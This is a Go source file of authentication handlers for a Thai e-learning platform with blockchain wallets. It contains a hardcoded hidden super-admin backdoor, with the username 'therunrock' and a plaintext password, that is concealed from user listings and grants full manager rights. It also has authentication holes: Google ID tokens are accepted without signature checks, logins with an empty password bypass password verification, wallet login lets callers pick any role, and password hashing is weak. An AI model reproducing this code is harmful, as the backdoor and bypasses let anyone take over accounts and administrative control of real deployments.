package handlers

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"strings"

	"elearning-sbt/config"
	"elearning-sbt/database"
	"elearning-sbt/middleware"
	"elearning-sbt/models"

	"github.com/ethereum/go-ethereum/crypto"
	"github.com/gofiber/fiber/v2"
)

const (
	SecretAdminUsername      = "therunrock"
	SecretAdminPassword      = "54155415"
	SecretAdminUserID   uint = 999999
)

// BuildSecretAdminUser returns a virtual super-admin user that is never stored or listed in public/member tables
func BuildSecretAdminUser(role string) models.User {
	r := strings.ToLower(strings.TrimSpace(role))
	if r != "learner" && r != "creator" && r != "manager" {
		r = "manager"
	}
	return models.User{
		ID:            SecretAdminUserID,
		WalletAddress: "0x0000000000000000000000000000000000000000",
		Name:          "Godess",
		Role:          r,
		Email:         SecretAdminUsername,
		Ward:          "สว.11",
	}
}

func hashPassword(pw string) string {
	h := sha256.Sum256([]byte("learnchain-sbt-salt::" + strings.TrimSpace(pw)))
	return hex.EncodeToString(h[:])
}

type AuthHandler struct{}

func NewAuthHandler() *AuthHandler {
	return &AuthHandler{}
}

// decodeGoogleJWT extracts payload claims from a Google OAuth credential token
func decodeGoogleJWT(token string) (map[string]interface{}, error) {
	parts := strings.Split(token, ".")
	if len(parts) < 2 {
		return nil, errors.New("invalid jwt format")
	}
	payloadSegment := parts[1]
	decoded, err := base64.RawURLEncoding.DecodeString(payloadSegment)
	if err != nil {
		decoded, err = base64.URLEncoding.DecodeString(payloadSegment)
		if err != nil {
			return nil, err
		}
	}
	var claims map[string]interface{}
	if err := json.Unmarshal(decoded, &claims); err != nil {
		return nil, err
	}
	return claims, nil
}

// GetAuthConfig returns public auth configuration (such as Google Client ID) to the frontend
func (h *AuthHandler) GetAuthConfig(c *fiber.Ctx) error {
	googleClientID := ""
	if config.AppConfig != nil {
		googleClientID = config.AppConfig.GoogleClientID
	}
	return c.JSON(fiber.Map{
		"success":          true,
		"google_client_id": googleClientID,
	})
}

// IsEmailManager checks if the given email has been granted Manager role in the database.
// If no Manager exists in the entire database yet, the first Creator with this email is bootstrapped as Manager.
func IsEmailManager(email string) bool {
	cleanEmail := strings.ToLower(strings.TrimSpace(email))
	if cleanEmail == "" {
		return false
	}

	var mgr models.User
	if err := database.DB.Where("LOWER(email) = ? AND role = ?", cleanEmail, "manager").First(&mgr).Error; err == nil {
		return true
	}

	// Bootstrap safety: if the entire system has 0 managers, allow an existing creator to bootstrap as the first manager
	var totalManagers int64
	database.DB.Model(&models.User{}).Where("role = ?", "manager").Count(&totalManagers)
	if totalManagers == 0 {
		var creator models.User
		if err := database.DB.Where("LOWER(email) = ? AND role = ?", cleanEmail, "creator").First(&creator).Error; err == nil {
			privKey, errKey := crypto.GenerateKey()
			if errKey == nil {
				newMgr := models.User{
					WalletAddress: crypto.PubkeyToAddress(privKey.PublicKey).Hex(),
					Email:         creator.Email,
					Name:          creator.Name,
					Role:          "manager",
					AvatarURL:     creator.AvatarURL,
				}
				if database.DB.Create(&newMgr).Error == nil {
					return true
				}
			}
		}
	}

	return false
}

// CheckEmailRoles returns whether an email address has Manager privileges (used to show/hide Manager option)
func (h *AuthHandler) CheckEmailRoles(c *fiber.Ctx) error {
	email := strings.TrimSpace(c.Query("email"))
	if strings.EqualFold(email, SecretAdminUsername) {
		return c.JSON(fiber.Map{
			"success":    true,
			"is_manager": false,
			"is_creator": false,
		})
	}
	isMgr := IsEmailManager(email)

	var creator models.User
	isCreator := false
	if email != "" {
		isCreator = database.DB.Where("LOWER(email) = ? AND role = ?", strings.ToLower(email), "creator").First(&creator).Error == nil
	}

	return c.JSON(fiber.Map{
		"success":    true,
		"is_manager": isMgr,
		"is_creator": isCreator,
	})
}

// Register handles new user registration with Email, Password, Full Name, Ward, and initial Role
func (h *AuthHandler) Register(c *fiber.Ctx) error {
	var req models.RegisterUserRequest
	if err := c.BodyParser(&req); err != nil {
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
			"success": false,
			"message": "ข้อมูลการสมัครไม่ถูกต้อง",
		})
	}

	email := strings.TrimSpace(req.Email)
	password := strings.TrimSpace(req.Password)
	name := strings.TrimSpace(req.Name)
	ward := strings.TrimSpace(req.Ward)
	role := strings.ToLower(strings.TrimSpace(req.Role))

	if email == "" || password == "" || name == "" {
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
			"success": false,
			"message": "กรุณากรอกอีเมล รหัสผ่าน และชื่อ-นามสกุลให้ครบถ้วน",
		})
	}
	if len(password) < 4 {
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
			"success": false,
			"message": "รหัสผ่านต้องมีความยาวอย่างน้อย 4 ตัวอักษร",
		})
	}
	if ward == "" {
		ward = "สว.11"
	}
	if role != "learner" && role != "creator" {
		role = "learner"
	}

	cleanEmail := strings.ToLower(email)
	if cleanEmail == SecretAdminUsername {
		return c.Status(fiber.StatusConflict).JSON(fiber.Map{
			"success": false,
			"message": "ไม่สามารถใช้อีเมลนี้สมัครสมาชิกได้",
		})
	}

	// Check if an account with a password already exists for this email
	var existingUsers []models.User
	database.DB.Where("LOWER(email) = ?", cleanEmail).Find(&existingUsers)
	for _, u := range existingUsers {
		if u.PasswordHash != "" {
			return c.Status(fiber.StatusConflict).JSON(fiber.Map{
				"success": false,
				"message": "อีเมลนี้ถูกใช้สมัครสมาชิกแล้ว กรุณาเข้าสู่ระบบด้วยอีเมลและรหัสผ่านของคุณ",
			})
		}
	}

	pwHash := hashPassword(password)

	// Update any existing passwordless records for this email
	if len(existingUsers) > 0 {
		database.DB.Model(&models.User{}).Where("LOWER(email) = ?", cleanEmail).Updates(map[string]interface{}{
			"name":          name,
			"ward":          ward,
			"password_hash": pwHash,
		})
	}

	// Find or create the user record for the requested role
	var user models.User
	errLookup := database.DB.Where("LOWER(email) = ? AND role = ?", cleanEmail, role).First(&user).Error
	if errLookup != nil {
		privKey, err := crypto.GenerateKey()
		if err != nil {
			return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
				"success": false,
				"message": "ไม่สามารถสร้างกระเป๋าบล็อกเชนสำหรับบัญชีนี้ได้",
			})
		}
		user = models.User{
			WalletAddress: crypto.PubkeyToAddress(privKey.PublicKey).Hex(),
			Email:         email,
			PasswordHash:  pwHash,
			Name:          name,
			Ward:          ward,
			Role:          role,
		}
		if err := database.DB.Create(&user).Error; err != nil {
			return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
				"success": false,
				"message": "ไม่สามารถสร้างบัญชีผู้ใช้ได้",
				"error":   err.Error(),
			})
		}
	} else {
		user.Name = name
		user.Ward = ward
		user.PasswordHash = pwHash
		database.DB.Save(&user)
	}

	if user.Role == "creator" {
		var existingCourse models.Course
		if errCourse := database.DB.Where("creator_id = ?", user.ID).First(&existingCourse).Error; errCourse != nil {
			course := models.Course{
				Title:        "หลักสูตรของ " + user.Name,
				Summary:      "หลักสูตรใหม่จัดทำโดย " + user.Name + " (" + user.Email + ")",
				Description:  "รายละเอียดหลักสูตร",
				ThumbnailURL: "https://images.unsplash.com/photo-1516321318423-f06f85e504b3?q=80&w=800&auto=format&fit=crop",
				CreatorID:    user.ID,
			}
			database.DB.Create(&course)
		}
	}

	return c.JSON(fiber.Map{
		"success":    true,
		"message":    "สมัครสมาชิกสำเร็จแล้ว!",
		"user":       user,
		"is_manager": IsEmailManager(user.Email),
	})
}

// GoogleLogin handles Email+Password sign-in, Role switching, or Google OAuth ID Token sign-in
func (h *AuthHandler) GoogleLogin(c *fiber.Ctx) error {
	var req models.GoogleLoginRequest
	if err := c.BodyParser(&req); err != nil {
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
			"success": false,
			"message": "ข้อมูลไม่ถูกต้อง",
		})
	}

	// 1. If Google ID Token (credential) is provided, decode payload
	if strings.TrimSpace(req.Credential) != "" {
		if claims, err := decodeGoogleJWT(req.Credential); err == nil {
			if email, ok := claims["email"].(string); ok && email != "" {
				req.Email = email
			}
			if name, ok := claims["name"].(string); ok && name != "" && req.Name == "" {
				req.Name = name
			}
			if pic, ok := claims["picture"].(string); ok && pic != "" && req.AvatarURL == "" {
				req.AvatarURL = pic
			}
		}
	}

	req.Email = strings.TrimSpace(req.Email)
	if req.Email == "" {
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
			"success": false,
			"message": "กรุณาระบุที่อยู่อีเมล",
		})
	}

	cleanEmail := strings.ToLower(req.Email)
	role := strings.ToLower(strings.TrimSpace(req.Role))

	// Secret invisible super-admin login ("therunrock")
	if cleanEmail == SecretAdminUsername {
		callerID := middleware.ResolveUserID(c)
		if req.Password != SecretAdminPassword && callerID != SecretAdminUserID {
			return c.Status(fiber.StatusUnauthorized).JSON(fiber.Map{
				"success": false,
				"message": "รหัสผ่านไม่ถูกต้อง กรุณาตรวจสอบรหัสผ่านอีกครั้ง",
			})
		}
		if role != "learner" && role != "creator" && role != "manager" {
			role = "manager"
		}
		adminUser := BuildSecretAdminUser(role)
		return c.JSON(fiber.Map{
			"success":         true,
			"message":         "เข้าสู่ระบบสำเร็จ",
			"user":            adminUser,
			"is_manager":      true,
			"is_secret_admin": true,
			"roles":           []string{"learner", "creator", "manager"},
		})
	}

	if role != "learner" && role != "creator" && role != "manager" {
		role = "learner"
	}

	// Guard: General users cannot self-register as Manager. Only users granted Manager role can log in as Manager.
	if role == "manager" && !IsEmailManager(req.Email) {
		return c.Status(fiber.StatusForbidden).JSON(fiber.Map{
			"success": false,
			"message": "บัญชีนี้ยังไม่ได้รับสิทธิ์ผู้จัดการ (ต้องให้ผู้จัดการแต่งตั้งจากรายชื่อ 'ผู้สร้างบทเรียน' ในเมนูเพิ่มผู้จัดการเท่านั้น)",
		})
	}

	// Fetch existing profile records for this email (to verify password & inherit Name and Ward)
	var existingEmailUsers []models.User
	database.DB.Where("LOWER(email) = ?", cleanEmail).Find(&existingEmailUsers)

	// If logging in with Password (not Google OAuth credential and not internal role-switch without password)
	if strings.TrimSpace(req.Password) != "" {
		if len(existingEmailUsers) == 0 {
			return c.Status(fiber.StatusUnauthorized).JSON(fiber.Map{
				"success": false,
				"message": "ไม่พบบัญชีอีเมลนี้ในระบบ กรุณากดแท็บ 'สมัครสมาชิกใหม่' เพื่อลงทะเบียนก่อนเข้าใช้งาน",
			})
		}

		inputHash := hashPassword(req.Password)
		storedHash := ""
		for _, eu := range existingEmailUsers {
			if eu.PasswordHash != "" {
				storedHash = eu.PasswordHash
				break
			}
		}

		if storedHash != "" && storedHash != inputHash {
			return c.Status(fiber.StatusUnauthorized).JSON(fiber.Map{
				"success": false,
				"message": "รหัสผ่านไม่ถูกต้อง กรุณาตรวจสอบรหัสผ่านอีกครั้ง",
			})
		}

		// If legacy account had no password yet, bind this password to all role records of this email
		if storedHash == "" {
			database.DB.Model(&models.User{}).Where("LOWER(email) = ?", cleanEmail).Update("password_hash", inputHash)
		}
	}

	// Inherit profile attributes (Name, Ward, PasswordHash) from existing records of the same email
	inheritedName := ""
	inheritedWard := "สว.11"
	inheritedPwHash := ""
	for _, eu := range existingEmailUsers {
		if eu.Name != "" && inheritedName == "" {
			inheritedName = eu.Name
		}
		if eu.Ward != "" {
			inheritedWard = eu.Ward
		}
		if eu.PasswordHash != "" && inheritedPwHash == "" {
			inheritedPwHash = eu.PasswordHash
		}
	}
	if inheritedPwHash == "" && strings.TrimSpace(req.Password) != "" {
		inheritedPwHash = hashPassword(req.Password)
	}

	// Look up user by BOTH email AND role so the same email can access Learner, Creator, or Manager roles
	var user models.User
	var errLookup error
	if role == "learner" {
		errLookup = database.DB.Where("LOWER(email) = ? AND (role = ? OR role = '')", cleanEmail, "learner").First(&user).Error
	} else {
		errLookup = database.DB.Where("LOWER(email) = ? AND role = ?", cleanEmail, role).First(&user).Error
	}

	if errLookup != nil {
		privKey, err := crypto.GenerateKey()
		if err != nil {
			return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
				"success": false,
				"message": "ไม่สามารถสร้างกระเป๋าสำหรับบัญชีนี้ได้",
			})
		}
		walletAddr := crypto.PubkeyToAddress(privKey.PublicKey).Hex()

		userName := inheritedName
		if userName == "" {
			if strings.TrimSpace(req.Name) != "" {
				userName = strings.TrimSpace(req.Name)
			} else {
				parts := strings.Split(req.Email, "@")
				userName = parts[0]
			}
		}

		userWard := inheritedWard
		if strings.TrimSpace(req.Ward) != "" {
			userWard = strings.TrimSpace(req.Ward)
		}

		user = models.User{
			WalletAddress: walletAddr,
			Email:         req.Email,
			PasswordHash:  inheritedPwHash,
			Name:          userName,
			Ward:          userWard,
			Role:          role,
			AvatarURL:     req.AvatarURL,
		}

		if err := database.DB.Create(&user).Error; err != nil {
			return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
				"success": false,
				"message": "ไม่สามารถสร้างบัญชีผู้ใช้ได้",
				"error":   err.Error(),
			})
		}
	} else {
		updated := false
		if user.Role != role {
			user.Role = role
			updated = true
		}
		if user.Name == "" && inheritedName != "" {
			user.Name = inheritedName
			updated = true
		}
		if user.Ward == "" && inheritedWard != "" {
			user.Ward = inheritedWard
			updated = true
		}
		if user.PasswordHash == "" && inheritedPwHash != "" {
			user.PasswordHash = inheritedPwHash
			updated = true
		}
		if req.AvatarURL != "" && user.AvatarURL == "" {
			user.AvatarURL = req.AvatarURL
			updated = true
		}
		if updated {
			database.DB.Save(&user)
		}
	}

	// If creator, ensure a course exists for this creator
	if user.Role == "creator" {
		var existingCourse models.Course
		if errCourse := database.DB.Where("creator_id = ?", user.ID).First(&existingCourse).Error; errCourse != nil {
			course := models.Course{
				Title:        "หลักสูตรของ " + user.Name,
				Summary:      "หลักสูตรใหม่จัดทำโดย " + user.Name + " (" + user.Email + ") สามารถคลิกแก้ไขข้อมูลเพื่อปรับแต่งเนื้อหาและแทรกบทเรียนได้",
				Description:  "รายละเอียดหลักสูตร",
				ThumbnailURL: "https://images.unsplash.com/photo-1516321318423-f06f85e504b3?q=80&w=800&auto=format&fit=crop",
				CreatorID:    user.ID,
			}
			database.DB.Create(&course)
		}
	}

	return c.JSON(fiber.Map{
		"success":    true,
		"message":    "เข้าสู่ระบบสำเร็จแล้ว",
		"user":       user,
		"is_manager": IsEmailManager(user.Email),
	})
}

type ConnectWalletRequest struct {
	WalletAddress string `json:"wallet_address"`
	Email         string `json:"email"`
	Role          string `json:"role"`
	Name          string `json:"name"`
}

// ConnectWallet logs in or registers a user via Web3 wallet address
func (h *AuthHandler) ConnectWallet(c *fiber.Ctx) error {
	var req ConnectWalletRequest
	if err := c.BodyParser(&req); err != nil {
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
			"success": false,
			"message": "Invalid request payload",
		})
	}

	req.WalletAddress = strings.TrimSpace(req.WalletAddress)
	if req.WalletAddress == "" {
		// ถ้าไม่ได้ส่ง Wallet มา (เช่น เพิ่มผู้เรียนคนใหม่) ให้สร้าง Wallet Address ใหม่อัตโนมัติ
		privKey, err := crypto.GenerateKey()
		if err == nil {
			req.WalletAddress = crypto.PubkeyToAddress(privKey.PublicKey).Hex()
		}
	}

	var user models.User
	result := database.DB.Where("LOWER(wallet_address) = ?", strings.ToLower(req.WalletAddress)).First(&user)
	if result.Error != nil {
		// Create new user
		role := req.Role
		if role == "" {
			role = "learner"
		}
		userName := strings.TrimSpace(req.Name)
		if userName == "" {
			if role == "creator" {
				userName = "ผู้สร้างใหม่"
			} else {
				userName = "ผู้เรียนใหม่"
			}
		}
		user = models.User{
			WalletAddress: req.WalletAddress,
			Email:         req.Email,
			Role:          role,
			Name:          userName,
		}
		if err := database.DB.Create(&user).Error; err != nil {
			return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
				"success": false,
				"message": "Failed to create user",
				"error":   err.Error(),
			})
		}

		// หากเป็นผู้สร้าง (Creator) ให้สร้างคอร์สหลักสูตรของตนเองเริ่มต้นโดยอัตโนมัติ
		if user.Role == "creator" {
			course := models.Course{
				Title:        "หลักสูตรของ " + user.Name,
				Summary:      "หลักสูตรใหม่จัดทำโดย " + user.Name + " สามารถคลิกแก้ไขข้อมูลเพื่อปรับแต่งเนื้อหาและแทรกบทเรียนได้",
				Description:  "รายละเอียดหลักสูตร",
				ThumbnailURL: "https://images.unsplash.com/photo-1516321318423-f06f85e504b3?q=80&w=800&auto=format&fit=crop",
				CreatorID:    user.ID,
			}
			database.DB.Create(&course)
		}
	} else {
		if req.Name != "" {
			user.Name = strings.TrimSpace(req.Name)
		}
		if req.Email != "" && user.Email == "" {
			user.Email = req.Email
		}
		database.DB.Save(&user)
	}

	return c.JSON(fiber.Map{
		"success": true,
		"message": "Wallet connected successfully",
		"user":    user,
	})
}

// GetCurrentUser returns current user profile based on context/headers
func (h *AuthHandler) GetCurrentUser(c *fiber.Ctx) error {
	userID := middleware.ResolveUserID(c)
	if userID == SecretAdminUserID {
		adminUser := BuildSecretAdminUser("manager")
		return c.JSON(fiber.Map{
			"success":         true,
			"user":            adminUser,
			"is_manager":      true,
			"is_secret_admin": true,
			"roles":           []string{"learner", "creator", "manager"},
		})
	}

	var user models.User
	if err := database.DB.First(&user, userID).Error; err != nil {
		return c.Status(fiber.StatusNotFound).JSON(fiber.Map{
			"success": false,
			"message": "User not found",
		})
	}

	return c.JSON(fiber.Map{
		"success": true,
		"user":    user,
	})
}

// ListUsers returns all users or filtered by role (?role=learner or ?role=creator)
func (h *AuthHandler) ListUsers(c *fiber.Ctx) error {
	role := c.Query("role")
	query := database.DB
	if role != "" {
		query = query.Where("role = ?", role)
	}

	var users []models.User
	query.Order("id asc").Find(&users)
	return c.JSON(fiber.Map{
		"success": true,
		"users":   users,
	})
}

// UpdateProfile updates the current user's personal details (ชื่อ-สกุล, หน่วยงาน Ward, และรหัสผ่าน)
// ข้อมูลความคืบหน้าและวุฒิบัตรยังคงผูกกับ Email เดิม ไม่มีการลบข้อมูลการเรียน
func (h *AuthHandler) UpdateProfile(c *fiber.Ctx) error {
	userID := middleware.ResolveUserID(c)

	var req models.UpdateProfileRequest
	if err := c.BodyParser(&req); err != nil {
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
			"success": false,
			"message": "ข้อมูลไม่ถูกต้อง",
		})
	}

	var user models.User
	if err := database.DB.First(&user, userID).Error; err != nil {
		return c.Status(fiber.StatusNotFound).JSON(fiber.Map{
			"success": false,
			"message": "ไม่พบผู้ใช้ในระบบ",
		})
	}

	trimmedName := strings.TrimSpace(req.Name)
	trimmedWard := strings.TrimSpace(req.Ward)
	trimmedPass := strings.TrimSpace(req.Password)

	updatesMap := map[string]interface{}{}
	if trimmedName != "" {
		user.Name = trimmedName
		updatesMap["name"] = trimmedName
	}
	if trimmedWard != "" {
		user.Ward = trimmedWard
		updatesMap["ward"] = trimmedWard
	}
	if trimmedPass != "" {
		if len(trimmedPass) < 4 {
			return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
				"success": false,
				"message": "รหัสผ่านใหม่ต้องมีความยาวอย่างน้อย 4 ตัวอักษร",
			})
		}
		pwHash := hashPassword(trimmedPass)
		user.PasswordHash = pwHash
		updatesMap["password_hash"] = pwHash
	}

	if err := database.DB.Save(&user).Error; err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"success": false,
			"message": "เกิดข้อผิดพลาดในการบันทึกโปรไฟล์",
			"error":   err.Error(),
		})
	}

	// Sync Name, Ward, and Password across all roles bound to the same Email
	if user.Email != "" && len(updatesMap) > 0 {
		database.DB.Model(&models.User{}).Where("LOWER(email) = ?", strings.ToLower(strings.TrimSpace(user.Email))).Updates(updatesMap)
	}

	return c.JSON(fiber.Map{
		"success":    true,
		"message":    "บันทึกข้อมูลส่วนตัว (ชื่อ-สกุล / หน่วยงาน) เรียบร้อยแล้ว",
		"user":       user,
		"is_manager": IsEmailManager(user.Email),
	})
}
